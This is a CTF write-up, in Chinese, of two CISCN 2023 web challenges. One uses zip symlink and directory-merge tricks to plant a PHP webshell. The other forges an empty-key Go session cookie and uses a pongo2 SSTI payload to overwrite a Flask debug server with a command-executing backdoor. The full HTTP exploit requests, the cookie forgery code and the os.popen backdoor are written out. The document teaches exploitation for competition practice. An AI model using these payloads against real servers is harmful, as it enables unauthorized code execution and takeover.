---
创建: 2025-11-19
tags:
  - CTF/比赛/23/CISCN/Web
---

```table-of-contents
```

# Unzip

## 1 探索

根路由给了个文件上传的页面，我们随便选一个文件上传。

![[CISCN-23-Web-251119-201406.png]]

上传后，跳转到 `/upload.php` 页面，里面回显了源码。

![[CISCN-23-Web-251119-201426.png]]

## 2 源码分析

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};

//only this!
```

分析一下源码：
1. `$finfo = finfo_open(FILEINFO_MIME_TYPE);` 创建了一个基于 `FILEINFO_MIME_TYPE` 的 `fileinfo resource` 赋值给 `$finfo` 变量。
2. `finfo_file($finfo, $_FILES["file"]["tmp_name"])` 第一个参数接受了前面的 `$finfo`，表示 `finfo_file` 应该返回 `mime type` 形式的 `finfo`；第二个参数接收上传文件的临时文件路径，表示获取谁的 `finfo`。
3. 对于 `finfo_file` 的结果，和 `application/zip` 比较；如果为 `true`，则执行 `if` 块内的逻辑；其实就是要求我们上传的文件为 `zip` 类型而已。
4. `if` 块内的逻辑是：使用 `exec` 执行 `unzip` 解压，将文件解压到 `/tmp` 目录下；其中，`unzip` 的 `-o` 选项的作用是 `overwrite files WITHOUT prompting`，即覆盖文件 (如果是目录冲突会自动合并，不会覆盖)。

## 3 `zip`/`unzip`

### 3.1 zip 压缩的目录结构组织

#知识/zip压缩的目录结构组织

#### 3.1.1 压缩路径与解压路径

首先，我们要明确一个点，就是当我们使用 `zip out file1 file2 file2` 的时候，压缩出的压缩包的内部文件结构中，`file{1~3}` 都在最上层目录，可以认为是压缩包内“文件系统”的根目录。

比如下面，我们用 `zip test index.php test.php` 打包了两个文件

![[CISCN-23-Web-251120-154357.png]]

然后用 `7zip` 的图形界面打开这个压缩包，会发现那两个文件被打包到了 `test.zip/` 目录下，我们这里认为它就是压缩包内的根目录。

![[CISCN-23-Web-251120-154452.png]]

> [!note]
> 这里我们主要是要获取到一个认知，就是对于传给 `zip` 命令的每一项待压缩路径，它都会尝试将其“拼接”到压缩包的根路径后面，从这里开始保存。
> 
> 上面的例子中，对于压缩包内目录结构的组织，可以理解为下面伪代码展示的效果：
> `path.join('ziproot/', 'index.php'); path.join('ziproot/', 'test.php')`

> [!note]
> 解压的时候，默认也是把压缩包根目录下的文件解压到当前目录，即 
> `zipFs(xxx.zip/*/*) ==解压到=> sysFs(./*/*)` 的映射关系。
> 
> `zip` 并不能像 `tar` 那样可以保存文件系统本身的路径结构，也就是无法在任意工作目录把压缩包中内容解压到 `/real/path/to/target` 绝对路径。

#### 3.1.2 压缩嵌套文件夹

对于嵌套的文件夹来说，也是上面的规则，即：会把传递给 `zip` 命令的待压缩路径拼接到压缩包根路径后面，按照这个文件结构保存。

> [!attention]
> 对于一个待压缩路径 `path/to/to/target` 来说，真正被保存的可以认为只有 `target` 本身 (包括通配符匹配到的多个文件)，而 `path/to/to` 只是目录结构，会按照这个结构在压缩包的虚拟目录中创建一个一样的结构，但 `path/to/to` 在本机中代表的三个文件夹中的文件并不会被顺便保存。
> 
> 进一步讲，如果 `target` 是一个目录而不是文件，那么被保存的也只有 `target` 这个**目录文件**本身，`target` 目录下的文件并不会被顺便保存。

用伪代码来描述上面的逻辑的话，如下：

```js
zipPath = path.join('ziproot/', 'path/to/to/target')
copyTo(sysFs('path/to/to/target'), zipFs(zipPath))
```

多说无益，直接上例子

首先，我们准备两个文件 `test/1/2/1.txt` 和 `test/1/2/2.txt`

![[CISCN-23-Web-251120-161709.png]]

接着，我们分别用下面四种方式压缩出 `1.zip` `2.zip` `3.zip` `4.zip`

![[CISCN-23-Web-251120-161843.png]]

`1.zip` 内部的目录结构长这样
![[CISCN-23-Web-251120-162008.png]]

`4.zip` 和 `3.zip` 的目录结构长这样
![[CISCN-23-Web-251120-162044.png]]

还有一个特别的例子，就比如我们执行：

```shell
zip test /tmp/test/test.txt
```

其实对于压缩包内路径来说，还是相当于伪代码 `path.join('ziproot/', '/tmp/test/test.txt')`，根目录会被自动去掉。

![[CISCN-23-Web-251120-162426.png]]

![[CISCN-23-Web-251120-162625.png]]

### 3.2 zip 对软链接的处理

#### 3.2.1 默认跟随软链接

例如，我们建立一个软连接 `html -> /var/www/html`；
然后用 `zip html html` 把这个软连接压缩到 `html.zip`。 

![[CISCN-23-Web-251120-165243.png]]

然后我们解压 `html.zip`，会发现解压出的 `html` 不是软连接了，而是一个普通文件 (目录)

![[CISCN-23-Web-251120-165410.png]]

不过，由于我们的 `"target"` 是个目录，所以只压缩了这个目录本身，目录里面是空的；
如果我们的 `target` 换成一个链接到文件的软链接，那么解压出的就是文件本身了。

#### 3.2.2 使用 `-y` 选项不跟随软链接

所谓不跟随，就是把带有软连接属性的文件直接打包进压缩包，解压出的也是一摸一样的软链接文件。

如下图所示，使用 `-y` 选项将软链接压缩进压缩包，再解压出来的还是软连接文件本身。

![[CISCN-23-Web-251120-170044.png]]

## 4 目录软链接和解压目录冲突合并 => 任意目录文件上传

### 4.1 思路

前面题目就是接受一个 `zip` 压缩包并把它解压到 `/tmp/` 目录下。

然后经过我们上面对 `zip` 的探究，我们可以想到这样一种思路：
1. 先用 `zip -y` 压缩一个 `webRoot -> /var/www/html` 的软链接；
2. 后端 `unzip` 解压后，则是 `/tmp/webRoot -> /var/www/html`。
3. 然后再创建一个真实目录 `webRoot`，里面有 `webRoot/shell.php`；
4. 用 `zip` 压缩这个 `webRoot/shell.php`，上传到后端 `unzip` 解压；
5. 这时候后端解压到的路径就是 `/tmp/webRoot/shell.php`，但由于 `webRoot` 目录冲突了，那么 `unzip` 就会执行目录合并；
6. 在这里就是把 `shell.php` 拷贝到原来的 `webRoot -> /var/www/html` 下，以此实现任意目录的文件写入。

### 4.2 解题

现在我们就来实操上面的步骤：

先压缩 `webRoot -> /var/www/html` 软链接，得到 `payload1.zip` 文件

![[CISCN-23-Web-251120-171638.png]]

然后删除原来的软链接 `webRoot -> /var/www/html`，创建一个真实目录 `webRoot/`

![[CISCN-23-Web-251120-171716.png]]

然后在 `webRoot/shell.php` 中编辑一句话木马

![[CISCN-23-Web-251120-171748.png]]

最后压缩 `webRoot/shell.php` 到 `payload2.zip` 文件

![[CISCN-23-Web-251120-171814.png]]

然后依次上传 `payload1.zip` 和 `payload2.zip`

![[CISCN-23-Web-251120-172027.png]]

最后访问 `/shell.php`，执行命令获取 `flag`

![[CISCN-23-Web-251120-172112.png]]

## 5 总结

如果有这样一个场景，后端会把我们上传的文件解压到特定的我们不可利用的目录 (我们没法改变)，而我们的目的是把文件解压到其他可以利用目录，我们可以考虑本题的思路：

先上传一个压缩包，里面归档了一个链接到目标目录的软链接文件本身；解压后就能通过解压目录下的这个软链接访问到目标目录。

接着再上传另一个压缩包，里面归档了一个文件夹，文件夹名和之前的软链接重名，文件夹内部是我们想要上传到目标目录的文件；解压后，由于目录名冲突，`zip` 会默认执行合并操作，那么我们的文件就通过软链接合并到目标目录了。

通过这种方法，就能借助目录的软链接以及 `zip` 解压的目录名冲突合并机制，实现任意目录文件上传。

# go_session

## 1 探索

访问根路由，回显一个 `Hello, guest`，没其他东西了。

![[CISCN-23-Web-251120-184620.png]]

那就扫一下目录，只扫到一个 `500` 状态码的 `/admin` 路由

![[CISCN-23-Web-251120-190341.png]]

做到这突然想起来这题给了源码，那让我们瞧一下。

## 2 源码分析

源码包目录结构长这样：

![[CISCN-23-Web-251120-190551.png]]

其实只有一个 `main.go` 和 `route.go` 而已。

### 2.1 `main.go`

`main.go` 中就是注册了一下各个路由的处理函数，可以看到有 `/` `/admin` 和 `/flask` 三个路由，其中 `/flask` 路由应该和 `python` 有关。

![[CISCN-23-Web-251120-190632.png]]

### 2.2 `route.go`

`route.go` 的一开始，初始化了一个以 `cookie` 为存储方式的 `session`，并且存储密钥从环境变量获取；我之前做过的 [[Web_easygo]] 中利用伪随机数密钥来伪造 `sesion` 的方式这里并不适用。

![[CISCN-23-Web-251120-203246.png]]

#### 2.2.1 `/` 路由

```go
func Index(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] == nil {
		session.Values["name"] = "guest"
		err = session.Save(c.Request, c.Writer)
		if err != nil {
			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
			return
		}
	}

	c.String(200, "Hello, guest")
}
```

如果 `session` 的 `name` 键为 `nil`，则初始化为 `guest`；这个路由回显 `"Hello, guest"`，就是我们一开始看到的起始页面。

#### 2.2.2 `/admin` 路由

```go
func Admin(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] != "admin" {
		http.Error(c.Writer, "N0", http.StatusInternalServerError)
		return
	}
	name := c.DefaultQuery("name", "ssti")
	xssWaf := html.EscapeString(name)
	tpl, err := pongo2.FromString("Hello " + xssWaf + "!")
	if err != nil {
		panic(err)
	}
	out, err := tpl.Execute(pongo2.Context{"c": c})
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	c.String(200, out)
}
```

先是判断了一下 `session` 中存的 `name` 键的值是不是为 `admin`，如果不是直接返回 `500` 状态码，就是一开始我们访问 `/admin` 路由看到的。

接着从 *查询字符串* 中读取 `name` 的值，缺省值为 `ssti`，保存到 `name` 变量中；然后对这个变量执行 `html.EscapeString`，这一步主要是防 `xss` 的，会把 `< > & ' "` 五个符号符号处理成 `html` 实体；处理后的字符串保存到变量 `xssWaf`。

然后就是用 `pongo2` 模板库解析模板了，传入了 `gin` 的上下文 `c` 作为 `pongo2.Context`，也就是在模板中能访问到 `c`；这一步算是有明显的 `ssti` 了，但代码看到这暂时还没想起来利用思路。

并且这个路由要利用 `ssti` 的前提是能够绕过 `session`，这个也暂时没有思路。

#### 2.2.3 `/flask` 路由

```go
func Flask(c *gin.Context) {
	session, err := store.Get(c.Request, "session-name")
	if err != nil {
		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)
		return
	}
	if session.Values["name"] == nil {
		if err != nil {
			http.Error(c.Writer, "N0", http.StatusInternalServerError)
			return
		}
	}
	resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	c.String(200, string(body))
}
```

这个路由也是先判断一下 `session` 的 `name` 键是否有值，如果没有值，则再判断一下 `err != nil`，成立则直接返回 `500` 状态码；
这里应该是写错了，因为这个 `err` 是前面获取 `session` 对象时的 `err`，不应该用在这里；
因此这一步判断 `session` 的键 `name` 是否有值的操作其实可以认为没有，因为 `err == nil` 后续的逻辑就不会执行。

然后是从 *查询字符串* 中取出 `name` 键的值，缺省为 `guest`； 把取出的值拼接到 `http://127.0.0.1:5000/` 后面，作为路径；用 `GET` 请求去访问这串地址 (应该是 `python` 的 `flask` 服务)，得到的响应后返回给前端。

对于拼接到 `http://127.0.0.1:5000/` 后的 `c.DefaultQuery("name", "guest")`，有三种情况：
1. 我们传 `/flask` 不带 `name` 的 `queryString`，则用缺省值 `guest`，最后是 `http://127.0.0.1:5000/guest`
2. 我们传 `/flask?name=`，则获取到空字符串，最后是 `http://127.0.0.1:5000/`
3. 我们传 `/flask?name=xxx`，最后是 `http://127.0.0.1:5000/xxx`

上述第一和第三种情况的结果其实都一样，返回 `404` 的响应 (`200` 是 `go` 的响应，而 `:5000` 的响应需要根据响应体的内容判断)

![[CISCN-23-Web-251121-191630.png]]

而第二种情况，我们传 `/flask?name=`，实际访问 `http://127.0.0.1:5000/`，则会报错；由于 `go` 的响应的 `Content-Type` 是 `text/plain`，所以我们需要把响应复制到单独的 `html` 文件中看它长啥样。

![[CISCN-23-Web-251121-191957.png]]

复制到 `html` 文件中打开后，可以看到是 `werkzeug` 的报错界面，错误原因是 `request.args` 缺少键 `name`。

![[CISCN-23-Web-251121-183653.png]]

往下翻到 `/app/server.py` 后端源码，原来是 `:5000` 这边期望 `/?name=` 这种请求，然后就是简单原样回显我们传入的值，这份源码本身没有可以利用的点。

![[CISCN-23-Web-251121-183719.png]]

## 3 解题

### 3.1 思路

#### 3.1.1 `flask` 的 `Debug` 模式支持热重载

上面 `/flask` 路由的关键点在于开启了 `debug` 模式的 `flask` 支持热重载，也就是如果我们能想办法替换掉 `/app/server.py`，那么只要访问 `/flask?name=` 就能执行我们可控的 `/app/server.py`，从而执行任意 `py` 代码。

#### 3.1.2 `pongo2` 借助 `c *gin.Context` 实现路径可控任意文件上传

在前面 `ssti` 那步，我们直接传入了 `c` 这个 `gin` 的上下文变量；而通过这个变量我们是很容易保存上传文件的，只需：

```go
c.SaveUploadedFile(c.FormFile("file", "/app/server.py"))
```

让我们实际写一个例子来实践一下：

```go
package main

import (
	"github.com/flosch/pongo2/v6"
	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	r.POST("/", func(c *gin.Context) {
		ssti := c.Query("ssti")
		p, err := pongo2.FromString(ssti)
		if err != nil {
			panic(err)
		}
		html, err := p.Execute(pongo2.Context{"c": c})
		if err != nil {
			panic(err)
		}
		c.Header("Content-Type", "text/html")
		c.String(200, html)
	})
	r.Run(":3000")
}
```

```payload
POST /?ssti={{c.SaveUploadedFile(c.FormFile("file"),"test.py")}} HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPviqOHbBOwamUdGa
Host: localhost:3000
Content-Length: 139

------WebKitFormBoundaryPviqOHbBOwamUdGa
Content-Disposition: form-data; name="file"; filename="test.txt"

print("测试")
------WebKitFormBoundaryPviqOHbBOwamUdGa--
```

![[CISCN-23-Web-251121-195016.png]]

![[CISCN-23-Web-251121-195037.png]]

可以看到确实可行；但题目中还有一点需要解决，就是它 `html.EscapeString` 会处理双引号，而我们指定文件的表单字段名和保存的文件路径都是需要引号包裹的。

解决方法自然是不用引号，而是用其他能获取到字符串的东西代替。在 `pongo2` 模板里面我们能用的只有 `c` 这个对象，所以就要找里面能不能有什么函数或字段能够返回符合要求的字符串的。

第一个位置的表单字段名随便，所以我选择了 `c.Request.Method` 获取请求方法字符串，然后表单字段名就跟请求方法一样即可；

第二个位置的保存路径我们必须可控，为 `/app/server.py`，这里我们可以使用 `c.Request.Referer()` 获取请求头 `Referer` 的内容，然后在请求头中写入 `/app/server.py`。

另外还有一个细节，就是它对 `/admin` 路由的处理函数是注册在 `GET` 方法的，所以不能用 `POST`；不过 `GET` 还是 `POST` 都是语义上的，所以影响不大。

于是我们就能给出初步 `payload`：

```payload
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.Method),c.Request.Referer())}} HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIbHVShhwn70NghfR
Referer: /app/server.py
Host: www.example.com
Content-Length: 139

------WebKitFormBoundaryIbHVShhwn70NghfR
Content-Disposition: form-data; name="GET"; filename="1.txt"

from flask import Flask
from flask import request
import os

app = Flask(__name__)
 
@app.route('/')
def index():
    name = request.args['name']
    return os.popen(name).read()
 
 
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
------WebKitFormBoundaryIbHVShhwn70NghfR--
```

#### 3.1.3 `session` 伪造

上一步的想法得以实现的前提是能够绕过这一步：

![[CISCN-23-Web-251121-203319.png]]

看了一下前面的 `session` 的保存方式，是指定了一个密钥用来验证的，而且从环境变量 `SESSION_KEY` 中读取，这里我们似乎没办法伪造。

![[CISCN-23-Web-251121-203437.png]]

如果不看 wp，我是真的想不到居然还有环境变量没指定的情况；具体来说，它里面虽然写了从环境变量中获取 `SESSION_KEY`，但题目环境实际上根本没指定这个环境变量，也就是传递给 `NewCookieStore()` 的密钥是一个空字节序列，我们自己本地也很容易伪造。

我们直接写一个这样的伪造代码

```go
package main

import (
	"os"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/sessions"
)

func main() {
	r := gin.Default()
	store := sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))

	r.GET("/", func(c *gin.Context) {
		sess, err := store.Get(c.Request, "session-name")
		if err != nil {
			c.String(400, err.Error())
			return
		}
		sess.Values["name"] = "admin"
		err = sess.Save(c.Request, c.Writer)
		if err != nil {
			c.String(400, err.Error())
			return
		}
		c.String(200, "hello")
	})
	r.Run(":3000")
}
```

![[CISCN-23-Web-251121-204826.png]]

得到这串伪造的 `session`

```
Cookie: session-name=MTc2MzcyOTMzMnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwJiAZ99NJF2SkJ3XsC5D59SUiELzy_35aN72OzHGVYsw==; Path=/; Expires=Sun, 21 Dec 2025 12:48:52 GMT; Max-Age=2592000
```

### 3.2 实践

通过上面的三步分析，我们能合并出最终 payload：

```payload
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.Method),c.Request.Referer())}} HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIbHVShhwn70NghfR
Referer: /app/server.py
Host: 6be2bd91-55cf-4344-978b-9f417f78d28a.challenge.ctf.show
Cookie: session-name=MTc2MzcyOTMzMnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwJiAZ99NJF2SkJ3XsC5D59SUiELzy_35aN72OzHGVYsw==; Path=/; Expires=Sun, 21 Dec 2025 12:48:52 GMT; Max-Age=2592000
Content-Length: 139

------WebKitFormBoundaryIbHVShhwn70NghfR
Content-Disposition: form-data; name="GET"; filename="1.txt"

from flask import Flask
from flask import request
import os

app = Flask(__name__)
 
@app.route('/')
def index():
    name = request.args['name']
    return os.popen(name).read()
 
 
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
------WebKitFormBoundaryIbHVShhwn70NghfR--
```

用分析出的 `payload` 成功把 `/app/server.py` 替换成了我们自己的。

![[CISCN-23-Web-251121-211027.png]]

然后就是访问 `/flask?name=` 来执行命令了，这里我沿用了 `:5000` 的查询字符串参数 `name`，所以可以用 `/flask?name=?name=echo $FLAG` 来获取 `flag`，注意特殊符号要 `url` 编码 (其中空格得 `url` 编码两次)。

![[CISCN-23-Web-251121-211123.png]]

## 4 总结

这题的思路还是比较乱的，这里简单列一下解出本题的关键点：
1. `session` 的验证密钥通过环境变量获取，但环境变量未赋值，在 `github.com/gorilla/sessions v1.2.1` 版本中允许空字节序列作为密钥；于是我们能成功伪造 `session`，绕过 `session.Value["name"] == "admin"`。
2. 题目向 `pongo2` 模板中传入了变量 `c *gin.Context`，并且题中 `ssti` 非常容易利用，于是我们通过 `{{c.SaveUploadedFile(c.FormFile(c.Request.Method),c.Request.Referer())}}` 能够实现文件上传。
3. 题中 `/flask` 路由请求的 `:5000`，我们通过报错得知了是 `py` 的 `flask` 并且开启了 `debug` 模式，并且源码文件路径为 `/app/server.py`；而 `debug` 模式支持热重载，那么我们就可以利用前面的任意文件上传把 `python` 的源码文件换了，从而实现任意 `python` 代码执行。
